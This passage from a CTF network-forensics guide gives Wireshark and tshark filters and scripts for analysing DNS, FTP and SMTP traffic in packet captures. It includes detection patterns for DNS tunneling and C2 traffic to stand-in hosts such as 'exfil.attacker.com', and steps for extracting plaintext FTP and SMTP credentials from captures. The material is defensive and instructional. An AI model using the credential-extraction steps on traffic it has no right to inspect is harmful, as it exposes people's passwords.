# MX record (mail exchange)
dns.qry.type == 15

# TXT record (text - often used for verification or tunneling)
dns.qry.type == 16

# AAAA record (IPv6 address)
dns.qry.type == 28

# SRV record (service)
dns.qry.type == 33

# ANY record (any available records)
dns.qry.type == 255
```

**DNS Response Code Analysis:**

```bash
# Successful response
dns.flags.rcode == 0  # NOERROR

# Format error
dns.flags.rcode == 1  # FORMERR

# Server failure
dns.flags.rcode == 2  # SERVFAIL

# Non-existent domain
dns.flags.rcode == 3  # NXDOMAIN

# Not implemented
dns.flags.rcode == 4  # NOTIMP

# Query refused
dns.flags.rcode == 5  # REFUSED
```

**DNS Flags Analysis:**

```bash
# Authoritative answer
dns.flags.authoritative == 1

# Truncated response (may indicate TCP fallback needed)
dns.flags.truncated == 1

# Recursion desired
dns.flags.recdesired == 1

# Recursion available
dns.flags.recavail == 1

# Authenticated data (DNSSEC)
dns.flags.authenticated == 1

# Checking disabled
dns.flags.checkdisable == 1
```

**DNS Answer Analysis:**

```bash
# DNS responses with answers
dns.count.answers > 0

# Multiple answers
dns.count.answers > 1

# A record responses (IPv4 addresses)
dns.a

# Specific IP in response
dns.a == 192.168.1.100

# AAAA record responses (IPv6)
dns.aaaa

# CNAME responses
dns.cname

# MX record responses
dns.mx.mail_exchange

# TXT record responses
dns.txt

# NS record responses
dns.ns

# PTR record responses
dns.ptr.domain_name
```

### DNS Traffic Extraction with tshark

```bash
# Extract all queried domains
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u

# Extract DNS queries with timestamps
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e frame.time -e ip.src -e dns.qry.name

# Extract DNS responses with resolved IPs
tshark -r capture.pcap -Y "dns.flags.response == 1 && dns.a" -T fields -e dns.qry.name -e dns.a

# Extract TXT records
tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.qry.name -e dns.txt

# Extract DNS query types
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name -e dns.qry.type

# Extract NXDOMAIN responses
tshark -r capture.pcap -Y "dns.flags.rcode == 3" -T fields -e dns.qry.name

# Extract query/response pairs
tshark -r capture.pcap -Y "dns" -T fields -e ip.src -e ip.dst -e dns.qry.name -e dns.flags.response -e dns.a
```

### DNS Attack Pattern Detection

**DNS Tunneling Detection:**

DNS tunneling uses DNS queries/responses to exfiltrate data or establish C2 channels.

```bash
# Unusually long domain names
dns.qry.name.len > 50

# High volume of DNS queries to single domain
# (requires packet counting/scripting)
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head

# Subdomain with high entropy (random-looking)
dns.qry.name matches "^[a-f0-9]{20,}\\."

# TXT record queries (common for data exfiltration)
dns.qry.type == 16

# Unusual query types for data transfer
dns.qry.type == 16 || dns.qry.type == 10  # TXT or NULL

# Multiple subdomains to same base domain
dns.qry.name contains "tunnel.attacker.com"

# Base64-like patterns in subdomain
dns.qry.name matches "[A-Za-z0-9+/]{30,}"
```

**DNS Tunneling Indicators Script:**

```bash
# Count unique subdomains per domain
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn

# Calculate average query name length
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
awk '{sum+=length; count++} END {print sum/count}'

# Find queries with high entropy
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
grep -E '^[a-z0-9]{40,}\.'
```

**DNS C2 Detection:**

```bash
# Regular DNS beaconing (time-based pattern analysis)
# Requires scripting to detect periodic queries

# DGA (Domain Generation Algorithm) detection
# Look for random-looking domains
dns.qry.name matches "^[bcdfghjklmnpqrstvwxyz]{10,}\\."

# Fast flux detection (many IPs for single domain)
# Filter for domain, then check count of unique IPs in responses
dns.qry.name == "suspicious.com" && dns.a
```

**DNS Cache Poisoning Detection:**

```bash
# Multiple different answers for same query
# Requires manual inspection or scripting

# Mismatched Transaction IDs
# Would need to correlate query/response pairs

# Responses from unexpected servers
!(ip.src == 8.8.8.8 || ip.src == 1.1.1.1) && dns.flags.response == 1
```

**DNS Zone Transfer Detection:**

```bash
# AXFR queries (zone transfer)
dns.qry.type == 252

# AXFR responses (contains zone data)
dns.flags.response == 1 && dns.resp.type == 252

# Detect zone transfers
tcp.port == 53 && dns.qry.type == 252
```

**DNS Amplification Attack Detection:**

```bash
# Large DNS responses (potential amplification)
dns.flags.response == 1 && frame.len > 512

# ANY queries to authoritative servers
dns.qry.type == 255

# High volume of queries from single source
# Requires packet counting
```

### DNS Response Analysis

**Extract Resolved IP Addresses:**

```bash
# A records
tshark -r capture.pcap -Y "dns.a" -T fields -e dns.qry.name -e dns.a | sort -u

# AAAA records (IPv6)
tshark -r capture.pcap -Y "dns.aaaa" -T fields -e dns.qry.name -e dns.aaaa

# CNAME records
tshark -r capture.pcap -Y "dns.cname" -T fields -e dns.qry.name -e dns.cname

# MX records
tshark -r capture.pcap -Y "dns.mx.mail_exchange" -T fields -e dns.qry.name -e dns.mx.mail_exchange

# NS records
tshark -r capture.pcap -Y "dns.ns" -T fields -e dns.qry.name -e dns.ns

# PTR records (reverse DNS)
tshark -r capture.pcap -Y "dns.ptr.domain_name" -T fields -e dns.qry.name -e dns.ptr.domain_name
```

**TXT Record Analysis:**

TXT records are frequently used in CTF challenges for storing flags, verification tokens, or data exfiltration.

```bash
# All TXT record queries
dns.qry.type == 16

# TXT record responses
dns.txt

# Extract TXT record content
tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.qry.name -e dns.txt

# Search for specific patterns in TXT records
dns.txt contains "flag{"
dns.txt contains "key="
```

### DNS Statistics and Analysis

**Statistics Menu in Wireshark:**

```
Statistics → DNS
```

Provides:

- Query type distribution
- Response code distribution
- Top domains queried
- Request/response time analysis

**Command-Line Statistics:**

```bash
# Count query types
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.type | sort | uniq -c

# Top 10 queried domains
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -10

# Count response codes
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e dns.flags.rcode | sort | uniq -c

# Query/response ratio (potential DoS or scanning)
echo "Queries: $(tshark -r capture.pcap -Y 'dns.flags.response == 0' | wc -l)"
echo "Responses: $(tshark -r capture.pcap -Y 'dns.flags.response == 1' | wc -l)"

# Average response time
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e dns.time | \
awk '{sum+=$1; count++} END {print sum/count " seconds"}'
```

### DNS Reverse Lookup Analysis

```bash
# PTR queries (reverse DNS)
dns.qry.type == 12

# Extract reverse lookup queries
tshark -r capture.pcap -Y "dns.qry.type == 12" -T fields -e dns.qry.name

# In-addr.arpa queries (IPv4 reverse)
dns.qry.name contains "in-addr.arpa"

# ip6.arpa queries (IPv6 reverse)
dns.qry.name contains "ip6.arpa"
```

### Practical CTF DNS Scenarios

**Scenario 1: Flag Hidden in TXT Record**

```bash
# Search for flag pattern in DNS traffic
dns.txt contains "flag{"

# Extract all TXT records
tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.txt | grep -E "flag\{.*\}"

# Search in query names (DNS tunneling)
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | grep -E "flag"
```

**Scenario 2: Data Exfiltration via DNS**

```bash
# Find long subdomains (potential encoded data)
tshark -r capture.pcap -Y "dns.qry.name.len > 40" -T fields -e dns.qry.name

# Extract and decode base64-encoded subdomains
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
cut -d'.' -f1 | base64 -d 2>/dev/null

# Reconstruct data from sequential queries
tshark -r capture.pcap -Y "dns.qry.name contains 'exfil.target.com'" -T fields -e dns.qry.name | \
cut -d'.' -f1 | tr -d '\n' | base64 -d
```

**Scenario 3: C2 Domain Discovery**

```bash
# Find domains with unusual patterns
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
grep -vE '\.(com|net|org|edu|gov)$' | sort -u

# Find domains queried only once (potential DGA)
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
sort | uniq -c | awk '$1 == 1 {print $2}'

# Extract domains with low TTL (fast flux indicator)
tshark -r capture.pcap -Y "dns.a" -T fields -e dns.qry.name -e dns.a -e dns.resp.ttl | \
awk '$3 < 300'
```

**Scenario 4: Subdomain Enumeration Detection**

```bash
# Count unique subdomains for target domain
tshark -r capture.pcap -Y "dns.qry.name contains 'target.com'" -T fields -e dns.qry.name | sort -u | wc -l

# Extract NXDOMAIN responses (non-existent subdomains)
tshark -r capture.pcap -Y "dns.flags.rcode == 3 && dns.qry.name contains 'target.com'" -T fields -e dns.qry.name

# Find successful resolutions
tshark -r capture.pcap -Y "dns.flags.rcode == 0 && dns.qry.name contains 'target.com' && dns.a" -T fields -e dns.qry.name -e dns.a
```

**Scenario 5: DNS Rebinding Attack Detection**

```bash
# Find domains resolving to different IPs over time
tshark -r capture.pcap -Y "dns.qry.name == 'suspicious.com' && dns.a" -T fields -e frame.time -e dns.a

# Detect resolution to private IP ranges (potential rebinding)
tshark -r capture.pcap -Y "dns.a && (ip.addr == 10.0.0.0/8 || ip.addr == 172.16.0.0/12 || ip.addr == 192.168.0.0/16)" -T fields -e dns.qry.name -e dns.a

# Find domains with very low TTL (enables rapid rebinding)
tshark -r capture.pcap -Y "dns.resp.ttl < 10" -T fields -e dns.qry.name -e dns.a -e dns.resp.ttl
````

### DNSSEC Analysis

DNSSEC adds cryptographic signatures to DNS responses for authentication.

```bash
# DNSSEC queries
dns.qry.type == 43  # DS (Delegation Signer)
dns.qry.type == 46  # RRSIG (Resource Record Signature)
dns.qry.type == 47  # NSEC (Next Secure)
dns.qry.type == 48  # DNSKEY (DNS Public Key)
dns.qry.type == 50  # NSEC3 (Next Secure v3)

# DNSSEC validation flags
dns.flags.authenticated == 1  # Authenticated Data
dns.flags.checkdisable == 1    # Checking Disabled

# RRSIG records in response
dns.resp.type == 46

# Extract DNSSEC records
tshark -r capture.pcap -Y "dns.qry.type == 48" -T fields -e dns.qry.name -e dns.dnskey
````

### DNS over HTTPS (DoH) Analysis

DoH encrypts DNS queries within HTTPS traffic, making traditional DNS analysis more difficult.

```bash
# Potential DoH traffic (HTTPS to known DoH servers)
(ip.addr == 1.1.1.1 || ip.addr == 8.8.8.8 || ip.addr == 9.9.9.9) && tcp.port == 443

# DoH via HTTP/2 path inspection
http2.header.name == ":path" && http2.header.value contains "/dns-query"

# Common DoH providers
ip.addr == 1.1.1.1          # Cloudflare
ip.addr == 8.8.8.8          # Google
ip.addr == 9.9.9.9          # Quad9
ip.addr == 149.112.112.112  # Quad9 alternate

# SNI for DoH services
tls.handshake.extensions_server_name == "dns.google"
tls.handshake.extensions_server_name == "cloudflare-dns.com"
tls.handshake.extensions_server_name == "dns.quad9.net"
```

[Unverified: DoH traffic cannot be analyzed for DNS content without decryption unless SSLKEYLOGFILE is available]

### DNS over TLS (DoT) Analysis

```bash
# DoT traffic (TLS on port 853)
tcp.port == 853

# DoT with SNI
tcp.port == 853 && tls.handshake.extensions_server_name

# Extract DoT server names
tshark -r capture.pcap -Y "tcp.port == 853 && tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name
```

### Advanced DNS Analysis Techniques

**DNS Transaction ID Tracking:**

```bash
# Extract transaction IDs for query/response matching
tshark -r capture.pcap -Y "dns" -T fields -e dns.id -e dns.flags.response -e dns.qry.name -e ip.src -e ip.dst

# Find mismatched transaction IDs (potential spoofing)
# Requires scripting to correlate query/response pairs
```

**DNS Packet Size Analysis:**

```bash
# Large DNS packets (potential tunneling or amplification)
dns && frame.len > 512

# DNS over TCP due to truncation
tcp.port == 53 && dns.flags.truncated == 1

# Extract packet sizes for statistical analysis
tshark -r capture.pcap -Y "dns" -T fields -e frame.len -e dns.qry.name | sort -n
```

**DNS Query Frequency Analysis:**

```bash
# Queries per second to detect scanning or DoS
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e frame.time_epoch | \
awk '{print int($1)}' | sort | uniq -c

# Find high-frequency queries (potential beaconing)
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
sort | uniq -c | sort -rn | head -20

# Time delta between queries to same domain
tshark -r capture.pcap -Y "dns.qry.name == 'target.com'" -T fields -e frame.time_relative
```

**DNS Source/Destination Analysis:**

```bash
# Identify DNS servers being queried
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e ip.dst | sort -u

# Identify responding DNS servers
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e ip.src | sort -u

# Unusual DNS servers (not common public resolvers)
dns.flags.response == 1 && !(ip.src == 8.8.8.8 || ip.src == 8.8.4.4 || ip.src == 1.1.1.1 || ip.src == 1.0.0.1)

# Client systems making DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e ip.src | sort -u
```

**Multi-Label Subdomain Analysis:**

```bash
# Count labels in domain names (high count may indicate tunneling)
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
awk -F. '{print NF-1, $0}' | sort -rn | head -20

# Extract domains with many subdomains
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | \
awk -F. 'NF > 5' | sort -u
```

**Character Distribution Analysis (Entropy Calculation):**

```bash
# Python script to calculate entropy of DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
python3 -c "
import sys
from collections import Counter
import math

for line in sys.stdin:
    domain = line.strip().split('.')[0]
    if len(domain) > 10:
        freq = Counter(domain)
        entropy = -sum((count/len(domain)) * math.log2(count/len(domain)) 
                      for count in freq.values())
        if entropy > 3.5:  # High entropy threshold
            print(f'{entropy:.2f} {line.strip()}')
"
```

### DNS Response Time Analysis

```bash
# Display DNS response times
dns.time

# Slow DNS responses (potential issue or throttling)
dns.time > 0.5

# Extract response times for analysis
tshark -r capture.pcap -Y "dns.time" -T fields -e dns.qry.name -e dns.time | \
awk '$2 > 1.0 {print $0}'  # Responses over 1 second

# Average response time per DNS server
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e ip.src -e dns.time | \
awk '{sum[$1]+=$2; count[$1]++} END {for(ip in sum) print ip, sum[ip]/count[ip]}'
```

### Wireshark Display Filter Examples for Complex DNS Analysis

**Combined Protocol Analysis:**

```bash
# HTTP requests following suspicious DNS queries
dns.qry.name contains "malicious" || (http && ip.dst == 203.0.113.50)

# DNS queries preceding data transfer
dns.qry.name == "target.com" || (tcp.stream eq 5 && frame.len > 1000)

# Correlation between DNS and subsequent connections
(dns.qry.name == "attacker.com") || (tcp.connection.syn && ip.dst == 198.51.100.25)
```

**Temporal Analysis:**

```bash
# DNS queries within specific timeframe
dns && frame.time >= "2024-01-01 12:00:00" && frame.time <= "2024-01-01 13:00:00"

# Recent DNS queries (last 10 seconds of capture)
dns && frame.time_relative > 100
```

**Statistical Anomaly Detection:**

```bash
# Queries with unusual characteristics
(dns.qry.name.len > 50) || (dns.count.answers > 10) || (dns.resp.ttl < 10)

# Multiple query types to same domain (reconnaissance)
dns.qry.name == "target.com" && (dns.qry.type == 1 || dns.qry.type == 15 || dns.qry.type == 16 || dns.qry.type == 255)
```

### Automated DNS Analysis Scripts

**Bash Script: Extract All DNS Intelligence**

```bash
#!/bin/bash
# dns_analysis.sh - Comprehensive DNS extraction from PCAP

PCAP=$1
OUTPUT_DIR="dns_analysis_output"

mkdir -p $OUTPUT_DIR

echo "[*] Extracting all queried domains..."
tshark -r $PCAP -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
sort -u > $OUTPUT_DIR/all_domains.txt

echo "[*] Extracting DNS resolutions (A records)..."
tshark -r $PCAP -Y "dns.a" -T fields -e dns.qry.name -e dns.a | \
sort -u > $OUTPUT_DIR/a_records.txt

echo "[*] Extracting TXT records..."
tshark -r $PCAP -Y "dns.txt" -T fields -e dns.qry.name -e dns.txt > $OUTPUT_DIR/txt_records.txt

echo "[*] Finding potential DNS tunneling..."
tshark -r $PCAP -Y "dns.qry.name.len > 40" -T fields -e dns.qry.name | \
sort -u > $OUTPUT_DIR/long_domains.txt

echo "[*] Extracting NXDOMAIN responses..."
tshark -r $PCAP -Y "dns.flags.rcode == 3" -T fields -e dns.qry.name | \
sort -u > $OUTPUT_DIR/nxdomain.txt

echo "[*] Finding top 20 queried domains..."
tshark -r $PCAP -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
sort | uniq -c | sort -rn | head -20 > $OUTPUT_DIR/top_domains.txt

echo "[*] Extracting unique DNS servers..."
tshark -r $PCAP -Y "dns.flags.response == 1" -T fields -e ip.src | \
sort -u > $OUTPUT_DIR/dns_servers.txt

echo "[*] Finding low TTL records..."
tshark -r $PCAP -Y "dns.resp.ttl < 300" -T fields -e dns.qry.name -e dns.a -e dns.resp.ttl | \
sort -u > $OUTPUT_DIR/low_ttl.txt

echo "[*] Analysis complete! Results in $OUTPUT_DIR/"
```

**Python Script: DNS Query Pattern Analysis**

```python
#!/usr/bin/env python3
# dns_pattern_analysis.py

import sys
from collections import defaultdict, Counter
import math

def calculate_entropy(string):
    """Calculate Shannon entropy of a string"""
    if not string:
        return 0
    freq = Counter(string)
    length = len(string)
    return -sum((count/length) * math.log2(count/length) for count in freq.values())

def analyze_dns_patterns(pcap_file):
    """Analyze DNS queries for suspicious patterns"""
    
    # Read DNS queries from tshark
    import subprocess
    cmd = ['tshark', '-r', pcap_file, '-Y', 'dns.flags.response == 0', 
           '-T', 'fields', '-e', 'dns.qry.name']
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    queries = [q.strip() for q in result.stdout.split('\n') if q.strip()]
    
    domain_counts = Counter(queries)
    base_domains = defaultdict(list)
    
    print(f"[*] Total DNS queries: {len(queries)}")
    print(f"[*] Unique domains: {len(set(queries))}")
    print()
    
    # Analyze patterns
    suspicious = []
    
    for query in set(queries):
        subdomain = query.split('.')[0] if '.' in query else query
        
        # Check for high entropy (random-looking)
        entropy = calculate_entropy(subdomain)
        if len(subdomain) > 15 and entropy > 3.5:
            suspicious.append(('High Entropy', query, f'{entropy:.2f}'))
        
        # Check for length
        if len(query) > 50:
            suspicious.append(('Long Domain', query, f'{len(query)} chars'))
        
        # Check for hex patterns
        if len(subdomain) > 20 and all(c in '0123456789abcdef' for c in subdomain.lower()):
            suspicious.append(('Hex Pattern', query, 'Potential encoded data'))
        
        # Check for base64-like patterns
        if len(subdomain) > 20 and all(c.isalnum() or c in '+/=' for c in subdomain):
            suspicious.append(('Base64-like', query, 'Potential encoded data'))
    
    # Report suspicious patterns
    if suspicious:
        print("[!] Suspicious DNS Patterns Detected:")
        for pattern_type, domain, detail in suspicious:
            print(f"  [{pattern_type}] {domain} - {detail}")
    else:
        print("[*] No obvious suspicious patterns detected")
    
    print()
    print("[*] Top 10 Most Queried Domains:")
    for domain, count in domain_counts.most_common(10):
        print(f"  {count:4d} - {domain}")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        sys.exit(1)
    
    analyze_dns_patterns(sys.argv[1])
```

### DNS Carving and Reconstruction

**Extracting Data from DNS Tunneling:**

```bash
# Method 1: Simple concatenation of subdomains
tshark -r capture.pcap -Y "dns.qry.name contains 'exfil.attacker.com'" \
-T fields -e dns.qry.name | cut -d'.' -f1 | tr -d '\n' > extracted_data.txt

# Method 2: Ordered extraction (if sequence numbers present)
tshark -r capture.pcap -Y "dns.qry.name contains 'exfil.attacker.com'" \
-T fields -e frame.number -e dns.qry.name | sort -n | cut -d'.' -f1

# Method 3: Decode base32/base64 encoded subdomains
tshark -r capture.pcap -Y "dns.qry.name contains 'tunnel.com'" \
-T fields -e dns.qry.name | cut -d'.' -f1 | while read line; do 
    echo $line | base64 -d 2>/dev/null || echo $line | base32 -d 2>/dev/null
done

# Method 4: Extract from TXT record responses
tshark -r capture.pcap -Y "dns.txt && dns.qry.name contains 'c2.attacker.com'" \
-T fields -e dns.txt | tr -d '"' | base64 -d
```

### IOC Extraction from DNS

**Building Intelligence from DNS Traffic:**

```bash
# Extract all unique IPs from DNS responses
tshark -r capture.pcap -Y "dns.a" -T fields -e dns.a | sort -u > resolved_ips.txt

# Build domain-to-IP mapping
tshark -r capture.pcap -Y "dns.a" -T fields -e dns.qry.name -e dns.a | \
awk '{print $1 " -> " $2}' | sort -u > domain_ip_mapping.txt

# Extract all unique domains queried
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | \
sort -u > all_domains.txt

# Find domains resolving to private IPs (potential malware callback)
tshark -r capture.pcap -Y "dns.a && (ip.addr == 10.0.0.0/8 || ip.addr == 172.16.0.0/12 || ip.addr == 192.168.0.0/16)" \
-T fields -e dns.qry.name -e dns.a

# Extract MX records for email infrastructure mapping
tshark -r capture.pcap -Y "dns.mx.mail_exchange" -T fields -e dns.qry.name -e dns.mx.mail_exchange | sort -u

# Extract NS records for nameserver identification
tshark -r capture.pcap -Y "dns.ns" -T fields -e dns.qry.name -e dns.ns | sort -u
```

### Performance Considerations

**Large PCAP DNS Analysis:**

```bash
# Use ring buffer for memory-efficient processing
tshark -r large_capture.pcap -Y "dns" -w dns_only.pcap

# Process in chunks
split -l 100000 all_domains.txt domain_chunk_

# Parallel processing with GNU parallel
cat all_domains.txt | parallel -j 4 'echo {} | grep -E "pattern"'
```

**Optimization Tips:**

- Filter DNS traffic first, save to separate PCAP before detailed analysis
- Use `-Y` (display filter) instead of `-f` (capture filter) with tshark for post-capture analysis
- Leverage `sort -u` instead of `sort | uniq` for better performance
- Use `awk` for field extraction instead of multiple `cut` commands
- Process large datasets with streaming tools rather than loading into memory

### Important CTF Considerations

**Common DNS CTF Patterns:**

1. **Flag in TXT record**: Direct flag storage in DNS TXT responses
2. **Flag in subdomain**: Flag split across multiple DNS queries as subdomains
3. **Encoded flag**: Base64/Base32/Hex encoded data in queries or responses
4. **Sequenced exfiltration**: Data split with sequence numbers in subdomain
5. **Steganography**: Flag hidden in DNS timing or packet ordering
6. **Reverse lookup**: Flag in PTR record responses
7. **DNSSEC signatures**: Flag embedded in DNSSEC-related records

**Key Analysis Steps for CTF:**

1. Extract all unique domains and examine for patterns
2. Check TXT records for direct flag storage
3. Analyze subdomain patterns for encoded data
4. Look for unusually long domain names
5. Check for high-frequency queries to specific domains
6. Examine DNS response data for anomalies
7. Correlate DNS queries with subsequent HTTP/TCP connections
8. Check for non-standard query types (NULL, TXT, ANY)

Related advanced topics: [Inference: These topics build upon DNS analysis skills] Packet reassembly for fragmented DNS, DNS covert channel analysis, PCAP file carving and recovery, protocol anomaly detection, network flow analysis.

---

## FTP Traffic & File Extraction

### Protocol Fundamentals

FTP (File Transfer Protocol) operates on two channels:

- **Control channel**: TCP port 21 (commands and responses)
- **Data channel**: TCP port 20 (active mode) or high port (passive mode)

**Active vs Passive Mode:**

- Active: Server initiates data connection to client
- Passive: Client initiates both connections (firewall-friendly)

### Wireshark FTP Analysis

**Basic Display Filters:**

```
ftp                          # All FTP traffic
ftp.request.command          # FTP commands only
ftp.response.code            # Server responses
ftp-data                     # Data channel traffic
```

**Command-Specific Filters:**

```
ftp.request.command == "USER"    # Username attempts
ftp.request.command == "PASS"    # Password attempts
ftp.request.command == "RETR"    # File downloads
ftp.request.command == "STOR"    # File uploads
ftp.request.command == "LIST"    # Directory listings
```

**Credential Extraction:**

```
ftp.request.command == "USER" || ftp.request.command == "PASS"
```

FTP transmits credentials in plaintext. Follow the TCP stream (right-click packet → Follow → TCP Stream) to view the complete authentication exchange.

### File Extraction Methods

**Method 1: Wireshark Export Objects**

1. File → Export Objects → FTP-DATA
2. Select files from the list
3. Save to disk

[Inference] This method works reliably when FTP-DATA packets are properly identified by Wireshark's dissector.

**Method 2: Manual TCP Stream Reassembly**

For files transferred via FTP-DATA:

```bash
# Identify the data transfer conversation
# Filter: ftp-data

# Follow TCP stream of data channel
# Right-click packet → Follow → TCP Stream

# Save raw data
# Show data as: Raw
# Save as: [filename]
```

**Method 3: tshark Command-Line Extraction**

```bash
# List all FTP-DATA streams
tshark -r capture.pcap -Y "ftp-data" -T fields -e tcp.stream | sort -u

# Extract specific stream
tshark -r capture.pcap -Y "tcp.stream eq [STREAM_NUMBER]" -T fields -e data | \
xxd -r -p > extracted_file
```

**Method 4: Automated Extraction with NetworkMiner**

```bash
# Install NetworkMiner (if not present)
apt-get install networkminer

# Run NetworkMiner
networkminer
# Open PCAP file → Files tab shows extracted files automatically
```

NetworkMiner automatically reconstructs and extracts transferred files from multiple protocols including FTP.

### File Carving from Raw Data

When standard methods fail:

```bash
# Extract raw packet data
tshark -r capture.pcap -Y "ftp-data && tcp.stream eq [N]" -T fields -e data.data | \
tr -d '\n' | xxd -r -p > raw_data.bin

# Identify file type
file raw_data.bin

# For compressed/encoded files
binwalk raw_data.bin          # Identify embedded files
foremost -i raw_data.bin      # Carve known file types
scalpel raw_data.bin          # Alternative carving tool
```

### Advanced FTP Analysis Techniques

**Identifying File Transfers:**

```
ftp.request.command == "RETR" || ftp.request.command == "STOR"
```

Look for the filename in the FTP command packet, then locate corresponding ftp-data stream.

**Passive Mode Port Discovery:**

```
ftp.response.code == 227
```

Response format: `Entering Passive Mode (h1,h2,h3,h4,p1,p2)` Data port = p1 × 256 + p2

**Timeline Reconstruction:**

```bash
# Generate timeline of FTP activity
tshark -r capture.pcap -Y "ftp" -T fields \
  -e frame.time -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg
```

### Common CTF Scenarios

**Scenario 1: Multi-part File Transfer** Files transferred across multiple connections require reassembly:

```bash
# Identify all related streams
tshark -r capture.pcap -Y "ftp-data && ip.src == [SERVER_IP]" \
  -T fields -e tcp.stream | sort -u

# Extract each stream sequentially
for stream in $(tshark -r capture.pcap -Y "ftp-data" -T fields -e tcp.stream | sort -u); do
  tshark -r capture.pcap -Y "tcp.stream eq $stream" -T fields -e data.data | \
  tr -d '\n' | xxd -r -p > part_$stream.bin
done

# Concatenate if multiple parts
cat part_*.bin > complete_file
```

**Scenario 2: Obfuscated Filenames** Check for encoded filenames in RETR/STOR commands:

```bash
tshark -r capture.pcap -Y "ftp.request.command == \"RETR\"" \
  -T fields -e ftp.request.arg
```

Decode if Base64/URL-encoded:

```bash
echo "ZmxhZy50eHQ=" | base64 -d
```

**Scenario 3: Hidden Data in FTP Commands** Examine unusual command parameters or custom commands:

```
ftp.request.command && !(ftp.request.command matches "USER|PASS|RETR|STOR|LIST|PWD|CWD|QUIT")
```

### FTP Security Issues Relevant to CTF

**Anonymous Login:**

```
Username: anonymous
Password: [any email or blank]
```

Filter: `ftp.request.command == "USER" && ftp.request.arg == "anonymous"`

**Bounce Attack Indicators:** Look for PORT commands with third-party IP addresses:

```
ftp.request.command == "PORT"
```

## SMTP/POP3/IMAP Email Analysis

### Protocol Fundamentals

**Port Assignments:**

- SMTP: TCP 25 (plaintext), 587 (submission/STARTTLS), 465 (SMTPS)
- POP3: TCP 110 (plaintext), 995 (POP3S)
- IMAP: TCP 143 (plaintext), 993 (IMAPS)

**Protocol Characteristics:**

- All three use ASCII-based commands
- SMTP: Push protocol (sending)
- POP3: Pull protocol (download and delete)
- IMAP: Pull protocol (server-side management)

### SMTP Analysis

**Wireshark Display Filters:**

```
smtp                                    # All SMTP traffic
smtp.req                               # SMTP commands
smtp.rsp                               # Server responses
smtp.data.fragment                     # Email body data
```

**Key SMTP Commands:**

```
HELO/EHLO    # Identify client
MAIL FROM    # Sender address
RCPT TO      # Recipient address
DATA         # Begin message content
QUIT         # End session
```

**Credential Extraction (AUTH):**

```
smtp.req.command == "AUTH"
```

SMTP AUTH often uses Base64-encoded credentials:

```bash
# Extract auth data
tshark -r capture.pcap -Y "smtp.req.command == \"AUTH\"" -T fields -e smtp.req.parameter

# Decode Base64
echo "dXNlcm5hbWU6cGFzc3dvcmQ=" | base64 -d
# Output: username:password
```

**Email Content Extraction:**

**Method 1: Follow TCP Stream**

1. Filter: `smtp`
2. Locate DATA command packet
3. Right-click → Follow → TCP Stream
4. Email content appears after `354` response

**Method 2: tshark Export**

```bash
# Extract SMTP conversation
tshark -r capture.pcap -Y "smtp" -T fields -e smtp.data.fragment | \
tr -d '\n' > email_content.txt

# Or export complete SMTP data
tshark -r capture.pcap -Y "smtp.data.fragment" -T fields -e text > email_body.txt
```

**Method 3: Automated with NetworkMiner**

- Open PCAP in NetworkMiner
- Navigate to "Messages" tab
- View/export complete email messages

### Email Header Analysis

**Critical Headers for CTF:**

```
From:                  # Sender (can be spoofed)
To:                    # Recipient
Subject:               # Email subject
Date:                  # Timestamp
Message-ID:            # Unique identifier
Received:              # Mail server path (read bottom-up)
X-Originating-IP:      # Original sender IP
Content-Type:          # MIME type/encoding
```

**Extract headers:**

```bash
tshark -r capture.pcap -Y "smtp" -T fields -e text | \
grep -E "^(From|To|Subject|Date|Message-ID):"
```

### MIME and Attachment Extraction

**Identifying Attachments:**

```
smtp && mime_multipart
```

**Common MIME Content-Types:**

- `text/plain` - Plain text
- `text/html` - HTML email
- `application/octet-stream` - Binary attachment
- `image/*` - Image attachments
- `application/pdf` - PDF documents

**Extract Base64-Encoded Attachments:**

1. Identify MIME boundary in email
2. Locate `Content-Transfer-Encoding: base64` section
3. Extract Base64 content:

```bash
# Manual extraction from TCP stream
# Save email content to file: email.txt

# Extract attachment section (between MIME boundaries)
sed -n '/Content-Type: application/,/^--/p' email.txt | \
grep -v "Content-" | grep -v "^--" | base64 -d > attachment.bin

# Verify file type
file attachment.bin
```

**Method using tshark:**

```bash
# Export email body
